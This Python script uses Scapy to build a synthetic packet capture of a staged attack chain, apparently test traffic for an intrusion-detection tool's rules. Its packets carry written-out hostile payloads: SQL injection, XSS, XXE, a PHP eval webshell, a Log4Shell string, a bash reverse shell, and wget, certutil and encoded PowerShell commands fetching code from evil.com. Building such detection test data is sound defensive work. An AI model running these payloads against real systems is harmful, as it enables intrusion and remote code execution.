from __future__ import annotations

from datetime import datetime
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DEFAULT_OUTPUT = PROJECT_ROOT / "sample_data" / "demo_attack_chain.pcap"


def generate_demo_pcap(output_path: str | Path = DEFAULT_OUTPUT) -> Path:
    try:
        from scapy.all import DNS, DNSQR, Ether, ICMP, IP, TCP, UDP, Raw, wrpcap
    except ImportError as exc:
        raise RuntimeError("Scapy is required to generate the demo pcap. Install requirements.txt first.") from exc

    output = Path(output_path)
    output.parent.mkdir(parents=True, exist_ok=True)

    attacker = "10.0.0.99"
    target = "10.0.1.50"
    blacklisted = "203.0.113.99"
    external_c2 = "8.8.4.4"
    internal_peer = "10.0.1.60"
    baseline_host = "10.0.0.50"
    session_host = "10.0.0.51"
    base = datetime(2026, 1, 1, 12, 0, 0).timestamp()
    packets = []

    def add(pkt: object, offset: float) -> None:
        combined = Ether(dst="00:11:22:33:44:55", src="66:77:88:99:aa:bb") / pkt
        combined.time = base + offset
        packets.append(combined)

    def http_payload(method: str, path: str, host: str, body: str = "") -> bytes:
        if body:
            return (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                f"{body}"
            ).encode()
        return f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()

    # ============================================================
    # Pre-phase: baseline traffic to establish history
    # Needed by BASELINE_DEVIATION, BANDWIDTH_SPIKE, SESSION_DURATION_ANOMALY
    # ============================================================

    # Build baseline history from a separate host (so it stays small and clean)
    for window in range(10):
        w_start = window * 65.0
        for i in range(2):
            add(IP(src=baseline_host, dst=target) / TCP(sport=30000 + i, dport=80, flags="PA") /
                Raw(load=http_payload("GET", "/api/status", "demo.internal")), w_start + i * 0.5)
            add(IP(src=baseline_host, dst=internal_peer) / TCP(sport=30000 + i, dport=443, flags="PA") /
                Raw(load=http_payload("GET", "/health", "demo.internal")), w_start + i * 0.5 + 0.2)

    # Short single-packet sessions for SESSION_DURATION baseline on session_host
    for i in range(5):
        add(IP(src=session_host, dst=target) / TCP(sport=31000 + i, dport=8000 + i, flags="PA") /
            Raw(load=http_payload("GET", "/short", "demo.internal")), i * 65.0 + 0.8)

    # ============================================================
    # Phase 1: Reconnaissance
    # ============================================================
    ph1 = 400.0

    # Host scan -> HOST_SCAN (threshold=30)
    for i in range(35):
        add(IP(src=attacker, dst=f"10.0.1.{20 + i}") / TCP(sport=41000 + i, dport=80, flags="S"), ph1 + i * 0.2)

    # Port scan -> PORT_SCAN (threshold=20) + SENSITIVE_PORT
    for i, port in enumerate([21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 1521, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017, 4444, 5555, 6667, 9001, 31337]):
        add(IP(src=attacker, dst=target) / TCP(sport=42000 + i, dport=port, flags="S"), ph1 + 8.0 + i * 0.3)

    # ============================================================
    # Phase 2: Brute Force
    # ============================================================
    ph2 = 420.0

    for i in range(15):
        add(IP(src=attacker, dst=target) / TCP(sport=43000 + i, dport=22, flags="S"), ph2 + i * 0.5)

    for i in range(10):
        add(IP(src=attacker, dst=target) / TCP(sport=44000 + i, dport=3389, flags="S"), ph2 + 8.0 + i * 0.5)

    # ============================================================
    # Phase 3: Exploit (Web Attacks)
    # ============================================================
    ph3 = 435.0

    # SQL injection -> SQL_INJECTION
    add(IP(src=attacker, dst=target) / TCP(sport=45100, dport=80, flags="PA") /
        Raw(load=http_payload("GET", "/search?q=1' UNION SELECT username,password FROM users--", "demo.internal")), ph3)

    add(IP(src=attacker, dst=target) / TCP(sport=45101, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/login", "demo.internal", "user=admin' OR 1=1--&pass=x")), ph3 + 1.0)

    # XSS -> XSS
    add(IP(src=attacker, dst=target) / TCP(sport=45102, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/comment", "demo.internal", "msg=<script>alert(document.cookie)</script>")), ph3 + 2.0)

    # Path traversal -> HTTP_SUSPICIOUS
    add(IP(src=attacker, dst=target) / TCP(sport=45103, dport=80, flags="PA") /
        Raw(load=http_payload("GET", "/download?file=../../../etc/passwd", "demo.internal")), ph3 + 3.0)

    # SSRF -> HTTP_SUSPICIOUS
    add(IP(src=attacker, dst=target) / TCP(sport=45104, dport=80, flags="PA") /
        Raw(load=http_payload("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", "demo.internal")), ph3 + 4.0)

    # XXE -> WEB_ATTACK
    add(IP(src=attacker, dst=target) / TCP(sport=45105, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/api/xml", "demo.internal",
              '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>')), ph3 + 5.0)

    # SSTI -> WEB_ATTACK
    add(IP(src=attacker, dst=target) / TCP(sport=45106, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/template", "demo.internal", "name={{7*7}}")), ph3 + 6.0)

    # Webshell -> WEB_ATTACK
    add(IP(src=attacker, dst=target) / TCP(sport=45107, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/shell.php", "demo.internal",
              "cmd=@eval(base64_decode($_POST['code']))")), ph3 + 7.0)

    # JNDI/Log4Shell -> WEB_ATTACK
    add(IP(src=attacker, dst=target) / TCP(sport=45108, dport=80, flags="PA") /
        Raw(load=http_payload("GET", "/api?q=${jndi:ldap://evil.com/a}", "demo.internal")), ph3 + 8.0)

    # ============================================================
    # Phase 4: Command Execution
    # ============================================================
    ph4 = 446.0

    add(IP(src=attacker, dst=target) / TCP(sport=45200, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/exec", "demo.internal", "cmd=whoami")), ph4)

    add(IP(src=attacker, dst=target) / TCP(sport=45201, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/exec", "demo.internal",
              "cmd=bash -i >& /dev/tcp/198.51.100.9/4444 0>&1")), ph4 + 1.0)

    add(IP(src=attacker, dst=target) / TCP(sport=45202, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/exec", "demo.internal",
              "cmd=powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYQAnACkA")), ph4 + 2.0)

    # wget download -> MALICIOUS_COMMAND
    add(IP(src=attacker, dst=target) / TCP(sport=45203, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/exec", "demo.internal",
              "cmd=wget http://evil.com/payload.sh -O - | sh")), ph4 + 3.0)

    # certutil download -> MALICIOUS_COMMAND
    add(IP(src=attacker, dst=target) / TCP(sport=45204, dport=80, flags="PA") /
        Raw(load=http_payload("POST", "/exec", "demo.internal",
              "cmd=certutil -urlcache -split -f http://evil.com/a.exe")), ph4 + 4.0)

    # ============================================================
    # Phase 5: C2 Communication
    # ============================================================
    ph5 = 455.0

    # TLS weak -> TLS_FINGERPRINT
    add(IP(src=attacker, dst=external_c2) / TCP(sport=45300, dport=443, flags="PA") /
        Raw(load=b"\x16\x03\x01\x00\x90client hello; version=tlsv1.0; cipher=RC4-MD5; self_signed=true; sni=evil-c2.com"), ph5)

    add(IP(src=attacker, dst=external_c2) / TCP(sport=45301, dport=443, flags="PA") /
        Raw(load=b"\x16\x03\x01\x00\x80heartbeat; tlsv1.0; cipher=EXPORT-RC4-40-MD5; sni=c2.example.com"), ph5 + 2.0)

    # DNS tunneling -> DNS_ANOMALY (long domain + many queries)
    add(IP(src=attacker, dst=target) / UDP(sport=45300, dport=53) /
        DNS(qd=DNSQR(qname="a" * 60 + ".exfil.evil.com")), ph5 + 4.0)

    add(IP(src=attacker, dst=target) / UDP(sport=45301, dport=53) /
        DNS(qd=DNSQR(qname="x7k9m2p4r8n5q.exfil.com")), ph5 + 5.0)

    for i in range(42):
        add(IP(src=attacker, dst=target) / UDP(sport=45400 + i, dport=53) /
            DNS(qd=DNSQR(qname=f"query{i}.exfil.evil.com")), ph5 + 6.0 + i * 0.3)

    # Abnormal outbound -> ABNORMAL_OUTBOUND:
    # Multiple connections to same high-risk port, plus heartbeat pattern
    for i in range(7):
        add(IP(src=attacker, dst=external_c2) / TCP(sport=45500 + i, dport=4444, flags="S"), ph5 + 20.0 + i * 3.0)

    for i in range(5):
        add(IP(src=attacker, dst=external_c2) / TCP(sport=45600 + i, dport=1337, flags="S"), ph5 + 41.0 + i * 4.0)

    for i in range(5):
        add(IP(src=attacker, dst=external_c2) / TCP(sport=45700 + i, dport=31337, flags="S"), ph5 + 62.0 + i * 4.0)

    # C2 beacon keywords -> SIGNATURE_MATCH
    add(IP(src=attacker, dst=external_c2) / TCP(sport=45800, dport=443, flags="PA") /
        Raw(load=b"beacon checkin; cobaltstrike implant"), ph5 + 85.0)

    # ============================================================
    # Phase 6: Lateral Movement
    # ============================================================
    ph6 = 550.0

    for i in range(6):
        add(IP(src=attacker, dst=f"10.0.1.{60 + i}") / TCP(sport=46000 + i, dport=445, flags="PA") /
            Raw(load=fr"SMB Tree Connect Request Path: \\10.0.1.{60 + i}\ADMIN$".encode()), ph6 + i * 2.0)

    for i in range(5):
        add(IP(src=attacker, dst=f"10.0.1.{70 + i}") / TCP(sport=46100 + i, dport=3389, flags="S"), ph6 + i * 1.5)

    # ============================================================
    # Phase 7: Flooding
    # ============================================================
    ph7 = 565.0

    for i in range(105):
        add(IP(src=attacker, dst=target) / TCP(sport=47000 + i, dport=80, flags="S"), ph7 + i * 0.08)

    for i in range(55):
        add(IP(src=attacker, dst=target) / ICMP(), ph7 + 10.0 + i * 0.15)

    # ============================================================
    # Phase 8: Anomalies + Blacklist
    # ============================================================
    ph8 = 580.0

    # Blacklisted IP -> BLACKLIST_IP
    add(IP(src=attacker, dst=blacklisted) / TCP(sport=48000, dport=80, flags="S"), ph8)
    add(IP(src=blacklisted, dst=target) / TCP(sport=48001, dport=443, flags="S"), ph8 + 1.0)

    # Huge data spike from baseline_host: triggers BANDWIDTH_SPIKE + BASELINE_DEVIATION
    huge_data = b"Z" * 9500
    for i in range(25):
        add(IP(src=baseline_host, dst=target) / TCP(sport=48100 + i, dport=80, flags="PA") /
            Raw(load=huge_data), ph8 + 3.0 + i * 0.3)
    # Also spike on different ports/ips for unique_dst_ports/ips deviation
    for i in range(8):
        add(IP(src=baseline_host, dst=f"10.0.1.{100 + i}") / TCP(sport=48200 + i, dport=9000 + i, flags="PA") /
            Raw(load=huge_data), ph8 + 12.0 + i * 0.3)

    # ML_ANOMALY: large + risky port + length spike from attacker
    for i in range(8):
        add(IP(src=attacker, dst=external_c2) / TCP(sport=48200 + i, dport=4444, flags="PA") /
            Raw(load=b"X" * 9500), ph8 + 8.0 + i * 0.3)

    # SESSION_DURATION_ANOMALY: prolonged session from session_host
    for i in range(6):
        add(IP(src=session_host, dst=target) / TCP(sport=48300, dport=9090, flags="PA") /
            Raw(load=http_payload("GET", "/api/long-poll", "demo.internal")), ph8 + 20.0 + i * 150.0)

    # ============================================================
    # Write pcap
    # ============================================================

    # ============================================================
    # Write pcap
    # ============================================================
    wrpcap(str(output), packets)
    return output


if __name__ == "__main__":
    path = generate_demo_pcap()
    print(path)
